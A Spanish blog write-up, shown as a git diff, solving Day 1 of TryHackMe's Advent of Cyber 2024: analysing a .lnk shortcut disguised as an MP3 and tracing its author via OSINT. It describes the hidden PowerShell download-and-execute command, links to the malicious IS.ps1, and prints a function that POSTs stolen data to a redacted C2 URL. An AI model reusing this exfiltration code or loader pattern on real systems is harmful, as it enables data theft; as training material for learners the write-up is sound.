@@ -1,18 +1,169 @@
 ---
-title: "Día 1 - Advent of Cyber 2024"
+title: "Día 1 - Calendario de Adviento TryHackMe 2024"
 description: "En esta publicación resolvemos el reto del día 1 en el Advent of Cyber 2024 organizado por TryHackMe."
 image: "/images/blog/advent-of-cyber-2024/thumbnails/day1.png"
 date: "2024-12-01"
 author: "xhetic"
-tag: ["TryHackMe", "Principiante", "OPSEC"]
+tag: ["TryHackMe", "Principiante", "OPSEC", "Advent of Cyber"]
 category: "Writeups"
 featured: true
 ---
 
-# Bienvenido a mi Blog
+# Calendario de Adviento TryHackMe 2024 - Día 1 🎄🔍
 
-Este es un ejemplo de una página escrita en MDX. Puedes escribir contenido en Markdown y también incluir componentes de React.
+Bienvenidos al primer día del **Calendario de Adviento de Ciberseguridad 2024** de [TryHackMe](https://tryhackme.com/). Hoy nos enfrentamos a un reto que combina investigación digital y análisis de archivos sospechosos. ¿Listos para descubrir qué se oculta detrás del nombre "Glitch"? Vamos a resolverlo juntos. ¡Manos a la obra!
 
-## Sección de Ejemplo
+Room: [Advent of Cyber 2024](https://tryhackme.com/r/room/adventofcyber2024)
 
-Aquí hay un poco de texto de ejemplo para mostrar cómo se ve el contenido en esta página.
+## 🕵️ Historia: Una amenaza oculta
+
+**McSkidy** ha detectado una actividad sospechosa relacionada con una web que promete convertir vídeos de YouTube a MP3. Aunque parece inofensiva, hay señales de alerta que nos invitan a investigar más a fondo. Nuestra misión es descubrir qué hay detrás de esta fachada.
+
+## 🎯 Objetivos de aprendizaje
+
+1. Identificar archivos maliciosos vinculados a enlaces sospechosos.
+2. Entender los principios de **OPSEC** y errores comunes.
+3. Aprender a rastrear y atribuir identidades digitales.
+
+---
+
+## 🔗 Investigación del sitio web
+
+Primero, accede al laboratorio desde tu **AttackBox**. Usa la IP asignada para abrir el sitio en el navegador. A simple vista, parece un sitio legítimo con funcionalidades prometedoras, pero no te dejes engañar.
+
+![Sitio web](/images/blog/advent-of-cyber-2024/day1-img1.png)
+
+### 🚩 Riesgos comunes en sitios de conversión YouTube a MP3
+
+- **Malvertising**: Publicidad maliciosa que explota vulnerabilidades.
+- **Phishing**: Trampas para obtener información sensible.
+- **Malware embebido**: Archivos contaminados con software malicioso.
+
+Nosotros investigaremos más allá. Para ello, introduce un enlace de YouTube (por ejemplo, [este clásico](https://www.youtube.com/watch?v=dQw4w9WgXcQ)) y haz clic en "Convertir".
+
+![Sitio web](/images/blog/advent-of-cyber-2024/day1-img2.png)
+
+---
+
+## 🗂️ Analizando los archivos descargados
+
+Extrae el contenido del archivo `download.zip`. Encontrarás dos archivos: `song.mp3` y `somg.mp3`. Algo no cuadra con este segundo archivo...
+
+### 📋 Paso 1: Verificando los archivos
+
+Abre la terminal y usa el comando `file` para analizar ambos:
+
+```bash
+file song.mp3
+```
+
+Y veremos esta respuesta
+
+```bash
+song.mp3: Audio file with ID3 version 2.3.0,
+contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
+```
+
+Este archivo parece normal. Ahora probemos con el segundo:
+
+```bash
+file somg.mp3
+```
+
+Y la respuesta obtenida es
+
+```bash
+somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, 
+ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
+```
+
+**🧐 Sorpresa**: ¡Es un archivo **.lnk** (acceso directo) disfrazado de MP3!
+
+
+---
+
+## 🔍 Inspección del archivo .lnk
+
+Para investigar más a fondo, ejecuta `exiftool`:
+
+```bash
+exiftool somg.mp3
+```
+
+El resultado revela un comando **PowerShell** oculto que descarga y ejecuta un script malicioso (`IS.ps1`) desde un servidor remoto.
+
+- **-ep Bypass -nop**: Evita restricciones de seguridad.
+- **DownloadFile**: Utiliza este método para descargar el script [IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)
+- **iex**: Ejecuta el script tras descargarlo.
+
+
+---
+
+## 🕵️‍♂️ Rastreando al atacante
+
+Si analizamos por encima el script **IS.ps1** contiene la firma: **"Created by the one and only M.M."**. Vamos a buscar esta cadena en **GitHub** para ver si encontramos pistas sobre el creador.
+
+```bash
+"Created by the one and only M.M."
+```
+
+Accede al [resultado de búsqueda en GitHub](https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/7). Analiza los proyectos relacionados para obtener información sobre el atacante.
+
+---
+
+## 🧩 Preguntas del Reto (Flags)
+
+Para completar este primer desafío del calendario de adviento de TryHackMe, tendrás que responder las siguientes preguntas. A continuación, te explico cómo puedes encontrar cada respuesta sin dar directamente las soluciones.
+
+
+#### 1️⃣ **¿Quién es el autor de la canción (`song.mp3`)?**
+
+💡 **Pista**: Ejecuta `exiftool song.mp3` en tu terminal. La respuesta estará en el campo `Artist`.
+
+```cmd
+T**** R******
+```
+
+
+#### 2️⃣ **¿Cuál es la URL del servidor C2 al que el script malicioso envía la información robada?**
+
+💡 **Pista**: La respuesta se consigue analizando la funcion `Send-InfoToC2Server` en el script [IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1).
+
+```bash
+# Function to send the stolen info to a C2 server
+function Send-InfoToC2Server {
+    $c2Url = "****://*********.***/****"
+    $data = Get-Content -Path $infoFilePath -Raw
+
+    # Using Invoke-WebRequest to send data to the C2 server
+    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
+}
+```
+
+
+#### 3️⃣ **¿Quién es M.M?**
+
+💡 **Pista**: Busca el [repositorio](https://github.com/JoshuaFerando/Mayor-Malware) coincidente con la firma **"Created by the one and only M.M."** en GitHub usando la barra de búsqueda.
+
+```bash
+🦹‍♂️ Hi, I’m M.M, also known as M**** M******. I run things in Wareville Town.
+```
+
+
+#### 4️⃣ **¿Cuántos commits tiene el repositorio donde se reportó el problema?**
+
+💡 **Pista**: Una vez encuentrado el [repositorio del script donde la incidencia se produjo](https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search) , dirígete a la pestaña **"Commits"**. Allí podrás ver el número exacto de commits realizados.
+
+```bash
+* Commits
+```
+
+---
+
+## 📝 Conclusión
+
+Este ejercicio nos ha permitido desentrañar cómo un simple archivo puede convertirse en una amenaza seria. Hemos practicado análisis de archivos, investigación OSINT y rastreo de identidades digitales. ¿Has descubierto quién es "Glitch"? ¡Comparte tus resultados en los comentarios!
+
+---
+
+**⚠️ Nota**: Recuerda que este laboratorio es educativo. No intentes ejecutar estos comandos en entornos reales sin las precauciones adecuadas.
